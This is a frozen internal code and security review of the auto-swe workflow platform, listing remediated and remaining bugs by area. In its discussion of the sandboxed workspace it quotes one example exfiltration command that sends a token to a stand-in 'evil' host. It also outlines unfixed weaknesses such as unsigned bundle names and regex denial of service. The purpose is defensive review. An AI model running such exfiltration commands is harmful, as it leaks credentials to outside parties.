# auto-swe — Comprehensive Project Review

> **Point-in-time snapshot (frozen).** A seven-angle review — Security, Gateway, Worker/Temporal,
> Data/Shared/SDK/CLI, Web, Testing & Maintainability, Product & Strategy — first synthesized at
> commit `838f2f1` and then **re-verified finding-by-finding against `341a4f7`** on 2026-08-18,
> after a 40-commit remediation wave (`+28k/-7.5k` lines) landed in between. Every finding below
> carries its **current status** (FIXED / PARTIALLY FIXED / REMAINS) with a real `file:line`
> verified against the `341a4f7` tree. This is a historical review artifact, not a live issue
> tracker — verify against current code before acting. It is a sibling to
> [`REPO_REVIEW.md`](./REPO_REVIEW.md) (2026-06-09) and
> [`CODE_REVIEW-2026-07.md`](./CODE_REVIEW-2026-07.md).

---

## 1. Executive Summary

auto-swe remains an unusually accomplished codebase for what git history shows is a small,
fast-moving, effectively single-author effort. The engineering craft is real and consistent: the
workflow engine's pure-interpreter / Temporal-dispatcher split is genuinely excellent, credential
encryption and webhook HMAC verification survive adversarial review, type hygiene across ~110k LOC
is exceptional (6 `as any` repo-wide — most in test fixtures — zero `@ts-ignore`, zero non-null
assertions in source), and the test culture is behavioral rather than snapshot-driven (**2,157
tests across 175 files, all green** locally; zero snapshots).

**The headline of this re-verification is remediation velocity.** Between the first synthesis and
now, a large fraction of the original findings were closed at their root:

- **Build/onboarding is healthy again.** The broken Prisma seed (`tsx` unresolvable from
  `packages/shared`) that had reddened CI and broken the quickstart is fixed — `tsx` is now a
  `packages/shared` devDependency, a real-Postgres `migrations` CI job runs migrate+seed+idempotency,
  and the Docker publish gate now depends on the checks job. `yarn typecheck`, `yarn lint` (677
  files), `yarn test` (2,157), and `yarn docs:check` all pass locally.
- **The eval system's load-bearing seams shipped.** The regression harness now provisions each
  fixture at its pinned SHA and runs the version-pinned implementer through a real TDD loop (no
  longer "scores the fixture tree as a proxy"), and canary routing is wired end-to-end
  (`resolveCanaryPin()` → `ctx.agentVersions` → `resolveAgent`). The tooling to *measure* agent
  quality now exists — the one thing that most undercut the product story.
- **Whole categories of code findings closed.** Every workflow launch now routes through one
  transactional `launchTrackedWorkflow` helper (the 5× copy-paste is gone); the Jira webhook fails
  closed and actually starts a workflow; tenant isolation and the channel budget are enforced where
  they were only claimed; MCP URLs and the fd00::/8 SSRF bypass are guarded; the workspace container
  gained real resource caps and a cloud-metadata blackhole; the budget-usage race and the
  finalize-retry double-billing are fixed with atomic increments and an `endedAt` guard; hot-path
  indexes and the three missing config-singleton CHECK constraints were added; and doc-drift is now
  compiler-enforced (`yarn docs:check`), with CLAUDE.md's counts (52 models, 28 skills, 58 scanner
  patterns) all accurate.

What **remains** is a smaller, sharper set, in three buckets:

1. **A handful of untouched HIGH-severity code bugs.** The shell-step push-failure path still leaks
   the credential-embedded git remote into Temporal history; the bundle signature still doesn't
   cover `name`/`version` (a signed bundle is relabelable and replayable while staying VERIFIED); the
   scanner runs DB/bundle-supplied regex with no execution timeout (ReDoS); the merge webhook still
   writes `MERGED` before signaling Temporal (a single failed signal silently strands the merge); six
   `z.coerce.boolean()` query params still invert `?flag=false`; and the visual canvas still can't
   render or safely edit `humanDecision` nodes.

2. **Production validation still hasn't happened** — but the critique softens. Every quality claim
   is still a mechanism verified to exist rather than an outcome verified in anger, and no pilot has
   run. The difference now is that the measurement apparatus (evals, canary, gate/verdict capture)
   is built, so the gap is running it, not building it.

3. **Focus/sprawl is unchanged** and strategic, not fixable by a commit: one maintainer, eight
   product surfaces, zero external users.

### The findings that now lead

| # | Finding | Severity | Status |
|---|---------|----------|--------|
| 1 | Shell-step push failure leaks credential-embedded git remote into `workflow_steps` + Temporal history (redaction not wired on this path) | **HIGH** | REMAINS |
| 2 | Bundle signature covers only `{entities, dependencies}` — `name`/`version` unsigned → relabel/downgrade replay installs as VERIFIED | **HIGH** | REMAINS |
| 3 | Scanner compiles + runs DB/bundle-supplied regex against unbounded text with no timeout/RE2 → ReDoS (body length + count caps added, but a catastrophic pattern still compiles) | **HIGH** | PARTIALLY MITIGATED |
| 4 | Merge webhook writes `MERGED` before signaling Temporal → lost signal strands the merge; CI webhook drops failed signals; `z.coerce.boolean()` ×6 inverts `?flag=false` | **HIGH** | REMAIN |
| 5 | Visual canvas can't render `humanDecision` edges and rename/delete corrupts specs containing HITL nodes (`nodeEdges()` duplicated, missing `onApprove`/`onReject`/`onSubmit`) | **HIGH** | REMAINS |
| 6 | No production validation yet (mechanisms exist, outcomes unmeasured) + single-maintainer sprawl across eight surfaces | **HIGH (strategic)** | REMAINS (measurement tooling now shipped) |

---

## 2. Scorecard

Grades reflect the `341a4f7` state. Arrows show movement since the `838f2f1` synthesis.

| Dimension | Grade | Δ | One-line justification |
|---|---|---|---|
| Architecture (workflow engine) | **A−** | → | Pure interpreter + thin Temporal dispatcher + flat step registry; determinism by construction; still the best part of the repo |
| Code quality (gateway) | **A−** | ↑ | Launch consolidation, transactional `isDefault`, tenant isolation, groupBy stats all landed; residue is the merge-webhook ordering + boolean-coercion params |
| Code quality (worker) | **B+** | → | Budget-race and finalize-retry fixed, workspace hardened; shell-step redaction leak + HITL signal-slot + retry-push + TDD-timeout remain |
| Data model / shared | **A−** | ↑ | Index work, singleton CHECKs, key rotation shipped; bundle-signature identity + ReDoS are the two real carry-overs |
| Security | **B+** | ↑ | Token now scrubbed post-clone, MCP SSRF + fd00::/8 guarded, Jira fails closed; workspace egress open by design + soft-block scanner + `/:token` connection scoping remain |
| Web dashboard | **B** | → | localStorage-JWT fixed and three HITL node types now draw; the `humanDecision` canvas bugs, API-client bypass, and unrendered error states persist |
| Testing & maintainability | **A−** | ↑↑ | Seed fixed, coverage thresholds gate CI, auth hook unit-tested, doc-drift compiler; npm dependency automation is the clean remaining gap |
| Product / strategy | **B−** | ↑ | Eval measurement seams shipped and framing updated to a workflow platform; production validation + GTM + sprawl remain the strategic risks |

---

## 3. Cross-Cutting Themes

**Theme A — The remediation wave was real and root-level, not cosmetic.** The 40-commit delta did
not paper over findings; it closed them at the mechanism (one `launchTrackedWorkflow`, atomic budget
increments, a doc-drift compiler, a fixture-provisioning eval harness). This is the strongest
positive signal in the re-verification: the team fixes causes, not symptoms.

**Theme B — The remaining code bugs share one trait: they were never exercised by a test.** The
shell-step redaction leak, the merge-webhook signal ordering, the `humanDecision` canvas edges, and
the boolean-coercion params all sit on paths with no covering test — which is exactly why the
remediation wave (which was test-guided) walked past them. The worker's `executeImplementation`
money-path and the web canvas remain the two largest untested critical surfaces.

**Theme C — The Docker workspace is hardened but its egress is still open by design.** Resource
caps, `cap-drop=ALL`, `no-new-privileges`, and a cloud-metadata-IP blackhole all landed, and the
clone token is now scrubbed from `.git/config` and injected per-call. But the container keeps full
outbound networking (needed for git/npm), the bash scanner stays soft-block, and command-substitution
exfil (`curl https://evil/$(cat token)`) isn't matched — so the exfiltration chain is narrowed from
HIGH to a real-but-lower-severity residual, not eliminated.

**Theme D — Feature sprawl still outruns the UI in one place: HITL authoring.** Three of the four
human node types now render correct edges, but `humanDecision` still can't be drawn or safely
renamed on the canvas, and none of the four have an inspector config section — a headline feature
(with its own `docs/hitl-workflows.md`) that the visual editor can't fully express.

**Theme E — Doc drift is now compiler-enforced.** The single most durable fix: `yarn docs:check`
scans living docs for stale counts, version drift, and forbidden status prose, so the drift this
review's first pass flagged (49 vs 51 models, 27 vs 28 skills) can't silently recur. Point-in-time
reviews like this one are frozen under `docs/history/` and exempt.

---

## 4. Findings by Area (with current status)

Severity: **HIGH** / **MEDIUM** / **LOW**. Status verified against `341a4f7`.

### 4.1 Security

- **HIGH → MEDIUM (PARTIALLY FIXED) — GitHub-token exfiltration chain.** Token persistence is
  **fixed**: `workspace.ts` scrubs the credential from `origin` via `git remote set-url` right after
  clone and injects it per-call with `git -c http.extraheader`, so it no longer lives in
  `.git/config`. Workspace egress **remains open by design** — the new sidecar blackholes only
  cloud-metadata IPs, not general outbound. The bash scanner is **partially fixed** (7 new
  SHELL_COMMAND exfil patterns from the scanner-coverage work) but stays soft-block and does not
  catch command-substitution exfil. Net: narrowed, not closed.
- **FIXED — Jira webhook unauthenticated when no secret.** Now returns 401 when `webhookSecret` is
  unset and requires a valid HMAC; the path also launches a real workflow (`jira-<ticket>` dedup)
  instead of orphaning a `RunInput`.
- **MEDIUM (PARTIALLY FIXED) — public `/:token` webhook.** Global 200/min rate limit now applies,
  but the token still rides in the URL path and `payload.connectionId` is still used with **no
  ownership check** against the template's team/org — a token holder can target any connection UUID.
  This is the cleanest remaining security actionable.
- **FIXED — MCP URL SSRF.** `parseMcpServerRef` now runs the shared `isSafeProbeUrl` guard, rejecting
  loopback/RFC1918/link-local/metadata/IPv6-ULA at connect time.
- **FIXED — fd00::/8 SSRF bypass.** `ssrfGuard.ts` now matches `fc00::/8` and `fd00::/8`; guards
  consolidated into one module shared by credential/bundle/MCP/connector paths.
- **LOW (by design, REMAIN)** — 60s session cache lets a downgraded/deactivated user linger (now
  `SESSION_CACHE_TTL_MS`-tunable); cookie `secure` flag depends on `BASE_URL` scheme; DNS-rebinding
  (guards are text-level, documented).

**Strengths re-confirmed:** AES-256-GCM envelope (12-byte nonce, 16-byte tag, 32-byte key; key
rotation via `CONFIG_ENCRYPTION_KEY_PREVIOUS` now implemented); timing-safe GitHub + Slack HMAC;
pgvector bound parameters with code-controlled scope columns; bundle content-hash-then-signature
verify order.

### 4.2 Gateway

- **HIGH (REMAINS) — merge webhook loses the merge signal on partial failure** (`webhooks.ts:280-290`):
  status→`MERGED` still precedes `signalWorkflow`; a failed signal + redelivery finds no OPEN PR and
  no-ops. **Fix:** signal-first or make the update reversible like `hitlResolve.ts`.
- **HIGH (REMAINS) — `z.coerce.boolean()` inverts `?flag=false`** (`workflowRuns.ts:22,23,65`,
  `lessons.ts:17,21`, `agentLibrary.ts:24`): `Boolean("false") === true`. `slackChannels.ts:36`
  already shows the correct `z.enum(['true','false'])` fix to copy.
- **MEDIUM (REMAINS) — CI webhook drops failed Temporal signals** (`webhooks.ts:459-464`): rejected
  signals are only logged, handler returns 200, and `ciStatus` was already flipped so redelivery
  no-ops — the CI-fix loop silently never triggers.
- **MEDIUM (REMAINS) — `GET /teams/:id/members` leaks any team's roster** (`teams.ts:355-380`):
  `ENGINEER`-gated only, no membership guard, unlike `GET /:id` (`teams.ts:147`).
- **MEDIUM (PARTIALLY FIXED) — `/:id/retry`** (`workRequests.ts:667`): team-access check added, but
  the org **budget cap** (`assertOrgBudget` on submit) is still absent from retry.
- **FIXED** — Jira dead-end intake (now launches); `isDefault` toggle (validates first, one
  `$transaction`); start-run trio (one `launchTrackedWorkflow` with ledger-first + compensation);
  `GET /lessons/stats` (now `groupBy`); most `GET /:id` UUID param schemas.
- **PARTIALLY / LOW (REMAIN)** — run-cancel still writes CANCELLED before best-effort Temporal cancel
  (now race-guarded); `allocateWorkflowId` still `length+1` (but a resulting P2002 is now a clean 409);
  Temporal status helpers treat outage as absence; `CRON_FIELD` accepts out-of-range values; the
  `view_submission` path still awaits launch before the 3s Slack ack.

**Strengths re-confirmed:** `hitlResolve.ts` (atomic guard + rollback), high race literacy (bounded
P2002 loops, `$transaction` version+audit), Slack ack-first discipline, consistent error envelope +
pagination.

### 4.3 Worker / Temporal

- **HIGH (REMAINS) — shell-step redaction leak** (`shellStep.ts:225,326`): `finalizeWorkspaceVolume`
  runs `git push` without `tokenForRedact`, and the catch calls `redactToken(raw)` with no token in
  scope → a push failure leaks the credential-embedded `origin` URL into `passSummary` →
  `workflow_steps` + Temporal history. **The single most material carry-over.**
- **HIGH (REMAINS) — retry can't push / dies on empty diff** (`executeImplementation.ts:332-333`):
  every attempt re-runs the full paid TDD loop; `git commit` has no empty-diff guard and
  `push origin <branch>` has no `-f`, so a failure after a prior successful push strands the re-run.
- **MEDIUM (REMAINS) — HITL signal-slot clear-at-wait** (`runnable.ts:336`, `interpreter.ts:826`):
  `slots.clear(name)` before `condition(...)` erases a payload delivered before the interpreter
  reaches the node → false `TIMED_OUT`; and all fanOut branches of one node share a single
  `hitl_<nodeId>` slot.
- **MEDIUM (REMAINS) — TDD test runs capped at 120s** (`executeImplementation.ts:293` → `execShellAsync`
  default): only `execCapture` got the 600s bump, so a slow suite reads as failure every iteration.
- **PARTIALLY FIXED — workspace container** (`workspace.ts:189`): resource caps + `cap-drop=ALL` +
  `no-new-privileges` + metadata blackhole landed; a crash-reaper/janitor for leaked `workspace-*`
  containers is still absent.
- **PARTIALLY FIXED — `recordWorkflowStep`** (`templates.ts:111,129`): Slack post narrowed to
  terminal `FAILED`, but the `workflowStep.create` is still non-idempotent and the notify is still
  awaited inline.
- **FIXED** — `recordLlmUsage` (atomic `increment` + preflight `assertBudgetAvailable`);
  `finalizeWorkflowRun` retry (Slack + channel-budget + tracker all behind the `endedAt` guard).
- **LOW (REMAIN)** — no explicit `maxSteps`/`stopWhen` on `agent.generate` with `bash` in the toolset;
  unquoted `repo.defaultBranch` interpolation; `durationMs: 0` on implementer LLM responses. (The
  dead `if` block was reorganized away.)

**Strengths re-confirmed:** prototype-pollution-guarded `setPath`; type-only external imports in
`workflows/`; AgentTracer-in-`finally`; `REJECT_DUPLICATE` channel tasks; `endedAt`-guarded billing.

### 4.4 Data model / shared / SDK / CLI

- **HIGH (REMAINS) — bundle signature doesn't cover identity** (`bundle/index.ts:149-156,190-196`):
  `computeContentHash` hashes only `{dependencies, entities}`; `name`/`version`/`source`/`createdAt`
  stay unsigned, so a signed bundle is relabelable to any name/version and an old release replays
  under a bumped version, still VERIFIED. **Fix:** sign a canonicalization including `name`+`version`.
- **HIGH (PARTIALLY MITIGATED) — ReDoS** (`skillScanner.ts:27,56`, `scannerPatternLoader.ts:39`):
  DB/bundle regex is compiled and `.test()`-run against unbounded text with no RE2/timeout. The API
  now caps pattern **body** length (2000) and **count** (10), but `validateRegex` only checks that a
  pattern *compiles* — a catastrophic `(a+)+$` still passes and runs on every skill save + TDD
  iteration; UNVERIFIED bundles carrying patterns are installable. **Fix:** per-pattern timeout /
  RE2, or a `safe-regex`-style static check on save/install.
- **PARTIALLY FIXED — hot-path indexes:** `run_inputs` (3 indexes), `memory_items.workflow_run_id`,
  `connections.team_id`, `scheduled_work_requests` (4), and a partial-unique `pull_requests
  (repo_id, pr_number)` all landed. **Still missing:** `pull_requests.head_sha` (the CI webhook's
  filter) and `workflow_runs.started_at` / `(status, started_at)` (the runs list + count).
- **MEDIUM (REMAINS) — `skills.name` has no unique constraint** while `syncBuiltins` is
  findFirst+create → concurrent-boot dupes (tenancy columns were added without name-uniqueness).
- **FIXED — three singleton CHECK constraints** (`issue_tracker_config`, `knowledge_base_config`,
  `figma_config`) now exist; all 8 config singletons constrained and CLAUDE.md's claim is true.
- **LOW (REMAIN)** — over-broad EXFILTRATION patterns (bounded to advisory prose by the single-type
  loader, by design); `ScheduledWorkRequest.repository onDelete: Cascade` vs a live Temporal Schedule
  (latent — no delete route today); `EvalDataset`/`EvalRubric` `teamId`/`orgId` bare UUIDs, no FK;
  crypto envelope has no AAD binding and `lastFour` stores the whole secret for len ≤ 4; ~14
  near-identical `resolveXxxConfig` blocks; `stableStringify` no cycle guard / mishandles `Date`;
  CLI `parseFlags` misplaced and `runs tail` aborts the whole tail on one transient poll failure.
  (The old "keyVersion reserved" note is now stale — rotation is implemented.)

**Strengths re-confirmed:** excellent migration hygiene and schema documentation; shared
`verifyContentHash` gate; ed25519 verify never throws on malformed keys; doc counts accurate and
CI-enforced; CLI craftsmanship (distinct exit codes, token printed once, offline `bundle` dispatch).

### 4.5 Web dashboard

- **HIGH (REMAINS) — `useDetectJiraFields` bypasses the API client** (`useAdminConfig.ts:336-351`):
  relative `fetch`, no `Authorization`, no `credentials:'include'` → 404/401 in any split-origin
  deploy. The lone hook not going through `api.*`.
- **HIGH (REMAINS) — canvas rename/delete corrupts specs with HITL nodes** (`TemplateEditor.tsx`
  `handleDeleteNode`/`handleRename`): still patch a hand-rolled 7-key edge list, missing
  `onApprove`/`onReject`/`onSubmit` + `humanDecision.options[].next`. The shared `nodeEdges()`
  (`spec.ts:510`) exists and is correct but the editor still doesn't import it.
- **HIGH (REMAINS, narrowed) — `humanDecision` branch edges don't render**: `workflowLayout.ts`
  emits `kind:'onSubmit'` but `dagNode.tsx` `handleKindsFor(humanDecision)` returns only
  `['onTimeout']`, so React Flow drops the edges in editor and run viewer. The other three human node
  types now render correctly — only `humanDecision` remains.
- **MEDIUM (REMAIN)** — no `NodeInspector` config section for any human node type (editable only via
  read-only-looking Raw JSON); `/admin/organizations/[orgId]` still has no list page or nav link
  (reachable only by hand-typed URL); query error states still unrendered (dashboard shows the
  fresh-install onboarding screen on a gateway outage); nested `<button>` in the trace viewer still
  collapses the row on "show more".
- **LOW** — **FIXED**: the access token now lives in memory only (no localStorage JWT). **REMAIN**:
  inspector keystroke resets dragged node positions; global Delete/Backspace node-delete; trace
  polling re-downloads the entire trace set every 3s.

**Strengths re-confirmed:** a real product surface (onboarding empty-state, approvals-first home,
sophisticated run viewer with live DAG overlay / split-stream console / OTel deep links / in-run HITL
cards, full template lifecycle); good TanStack Query hygiene; small XSS surface; native `<dialog>`
modals; locale-aware date/number formatting now landed.

### 4.6 Testing, CI & Maintainability

- **FIXED — broken seed + publish gate:** `tsx` is a `packages/shared` devDependency; the
  real-Postgres `migrations` CI job runs migrate+seed+idempotency; `docker.yml` `publish`
  `needs: [setup, checks]`, so a red build no longer ships `:main`.
- **FIXED — coverage discarded:** `vitest.config.ts` now sets branch/function/line/statement
  thresholds, so a coverage regression fails CI.
- **FIXED — auth hook untested + doc drift:** `auth.hook.test.ts` exercises `hasRole` + `requireAuth`
  directly; `check-doc-drift.mjs` runs as a standalone `docs` CI job; Yarn is `4.18.0` everywhere.
- **PARTIALLY FIXED — web test coverage:** 13 → 20 test files, but still component/util-focused with
  most pages (and the canvas where the HIGH web bugs live) uncovered.
- **MEDIUM (REMAINS) — no npm dependency automation:** `dependabot.yml` still lists only
  `github-actions`; `yarn npm audit` is `|| true` and only on the publish path. **The clearest
  untouched maintainability gap.**
- **LOW (REMAIN)** — no e2e/browser tests.

**Strengths re-confirmed:** exceptional type hygiene (6 `as any`, mostly test fixtures; 0
`ts-ignore`; 0 non-null assertions in source; a Biome override forcing `useImportType` in
`workflows/**`); behavioral test culture (2,157 tests, 0 snapshots); real-DB migration CI; exact
dependency pinning; exemplary `.env.example`.

---

## 5. Product & Strategy

**Thesis and framing (updated).** `docs/product-overview.md` now leads with "durable, governed
multi-agent workflow platform," with ticket→PR explicitly "a starting point rather than the
boundary" and the Slack teammate + other DAGs framed as the same engine. The original review's
"framed only as ticket→PR" critique is now stale. The deeper strategic question is unchanged: no doc
yet identifies who buys *the platform* as opposed to the SWE tool, and the generic-orchestration
ground is crowded.

**Competitive position (unchanged).** The defensible wedge is still **self-hosted +
bring-your-own-model + governance** (RBAC/HITL/audit/budget caps/scanners) for regulated or
air-gapped teams the hosted coding agents serve poorly; versus Temporal+LangGraph DIY the value is
6–12 months of saved glue, sold to the buyer most able to DIY; versus n8n/Dify on generic-workflow
ground it lacks the connector ecosystem.

**Use cases.** Strongest: standard work request, CI self-healing (verified, low blast radius), HITL
approvals (the governance wedge). Weakest: multi-repo epics (compounding per-repo failure
probabilities + cross-repo auto merge-conflict resolution is the highest-variance capability).

**Monetization.** Still cost-governance, not billing: `OrgMonthlyUsage` + `monthlyBudgetUsdCents`
(verified, retry-guarded increment-upsert, 402 submit gate) is chargeback/caps — no payment rails,
invoicing, metering export, or seat model. No pricing, hosted tier, or design-partner program.

**Maturity honesty.** The measurement story materially improved: the eval seams that were deferred
now ship (fixture-provisioning harness + wired canary), so the apparatus to prove quality claims
exists. The remaining honesty gap is that nothing has run through it in production. Hardening
spot-check unchanged: rate limiting, backup/DR with the right caveats, and prod-compose secret
enforcement are present; the worker remains a single point of failure with docker.sock host access,
Temporal Cloud mTLS is unwired, and there's no Helm chart / alerting / SLOs / connection pooling.

**Adoption friction (unchanged, by design).** `assertConfigReady()` still refuses to start the
worker until config rows exist — elegant for day-2, a support-ticket generator on minute-1 — atop a
multi-container bootstrap (2 Postgres + Temporal + MinIO). Now better-documented, not reduced.

**Top strategic risks:** (1) production validation still hasn't happened (though the tooling now
exists to do it); (2) single-maintainer sprawl / bus-factor-1; (3) commoditization race against
hosted agents; (4) no GTM wedge (no pricing/pilot/low-friction entry; FSL caps community growth);
(5) unproven platform demand for the bundles/marketplace and multi-org surfaces.

---

## 6. Recommended Sequencing (updated to the `341a4f7` state)

**Now — the untouched HIGH code bugs (all small, all cheap):**
1. Thread the token into the `shellStep` push-failure redaction so the credential can't reach
   Temporal history. *(worker, §4.3)*
2. Reverse the merge webhook to signal-first (or make it idempotent/reversible); surface CI-webhook
   signal failures so GitHub redelivers. *(gateway, §4.2)*
3. Replace the six `z.coerce.boolean()` with `z.enum(['true','false'])`. *(gateway, §4.2)*
4. Sign bundle `name`+`version` and bump `BUNDLE_SCHEMA_VERSION`; add a compile-time regex-safety
   check (or per-pattern timeout) before persisting/installing scanner patterns. *(shared, §4.4)*
5. Import the shared `nodeEdges()` into the canvas editor and add the `humanDecision` `onSubmit`
   handle so its branches render and rename/delete stops corrupting HITL specs. *(web, §4.5)*

**Soon — the MEDIUM residue:**
6. Add the `isMember` guard to `GET /teams/:id/members`; add `assertOrgBudget` to `/:id/retry`;
   scope the `/:token` webhook's `connectionId` to the template's team. *(gateway/security)*
7. Bump the TDD test-run timeout off the 120s default; guard the implementer commit/push for
   empty-diff and retry; clear the HITL signal slot before notify (not after). *(worker)*
8. Add `pull_requests.head_sha` and `workflow_runs(status, started_at)` indexes; add a
   `skills.name` unique (partial on built-ins); add a label-keyed workspace-container reaper. *(data/worker)*
9. Add an `npm` ecosystem entry to `dependabot.yml` (or make `yarn npm audit` blocking on PRs).
   *(maintainability)*

**Then — validate the core loop (the actual roadmap):**
10. **Feature freeze**, then run the full stack for real — the maintainer's repos first, then 3–5
    design partners with well-specified backlogs.
11. Report weekly the two metrics that matter — **% of tickets merged without human code changes**
    and **human minutes per merged PR** — using the eval capture and canary routing that now exist.
12. Give the canvas HITL nodes inspector config sections and link the org-admin page — finish these
    headline surfaces or hide them.
13. Park the bundles/marketplace, Figma design-QA, and further Claude-Tag parity until ≥1 design
    partner independently builds a non-SWE workflow; re-decide platform-vs-tool with merge-rate data.

---

## 7. Open Questions for the Team

1. **Has anything run in production yet?** The measurement tooling (evals, canary, gate/verdict
   capture) now exists; a pilot is the gating step for every quality claim.
2. **Is the platform the product or the architecture?** The updated framing commits to the platform;
   a design partner building a non-SWE workflow is the evidence that would confirm it.
3. **Bundle marketplace: real near-term, or parked?** The signing gap (§4.4) is worth closing
   regardless, but the marketplace machinery has no sellers or buyers yet.
4. **GTM motion:** self-hosted-only (FSL as-is) or a hosted tier? `OrgMonthlyUsage` is the right
   foundation but billing is a project of its own.
5. **Web canvas HITL:** finish the authoring surface (edges + inspector) or narrow the visual editor
   to the node types it fully supports and route `humanDecision` through the JSON escape hatch?
